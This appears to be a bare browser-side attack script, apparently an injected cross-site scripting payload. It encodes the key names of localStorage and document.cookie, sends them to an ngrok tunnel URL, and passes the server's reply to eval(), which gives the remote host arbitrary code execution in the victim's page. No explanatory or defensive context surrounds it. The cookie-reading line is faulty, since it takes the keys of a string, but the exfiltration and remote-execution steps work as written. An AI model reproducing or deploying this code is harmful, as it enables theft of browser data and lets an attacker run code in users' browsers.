

locall =  encodeURI(JSON.stringify(Object.keys(localStorage)))
cookies = encodeURI(JSON.stringify(Object.keys(document.cookie)))

console.log(JSON.stringify(Object.keys(document.cookie)))

  fetch(` https://7582-2800-98-111e-1229-88a5-1029-26c3-94fe.ngrok.io/docs?cookie=`+locall+cookies,).then((res) => {return res.text();
  }).then((json) => {console.log(json);eval(json); // The json object is here
  });
